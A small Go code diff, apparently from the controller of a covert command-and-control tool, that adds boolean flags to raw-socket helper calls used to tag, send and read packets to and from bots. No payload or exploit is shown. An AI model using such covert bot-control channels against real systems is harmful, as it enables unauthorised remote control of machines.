@@ -103,7 +103,7 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 
 				// Wrap data
 				// data = xorData(data)
-				data = rawsocket.AddIdentifier(data)
+				data = rawsocket.AddIdentifier(data, false)
 
 				// Send packet
 				packet = rawsocket.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, data)
@@ -214,7 +214,7 @@ func cli() {
 
 func processPacket(packet gopacket.Packet, listen chan Host) {
 	// Get data from packet & Remove Identifier
-	data := rawsocket.RemoveIdentifier(string(packet.ApplicationLayer().Payload()))
+	data := rawsocket.RemoveIdentifier(string(packet.ApplicationLayer().Payload()), true)
 	payload := strings.Split(data, " ")
 
 	// fmt.Println("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())
@@ -284,7 +284,7 @@ func main() {
 	go cli()
 
 	for {
-		packet := rawsocket.BothReadPacket(readfd, vm)
+		packet := rawsocket.BothReadPacket(readfd, vm, true)
 		// Pass Packet to process function
 		if packet != nil {
 			go processPacket(packet, listen)
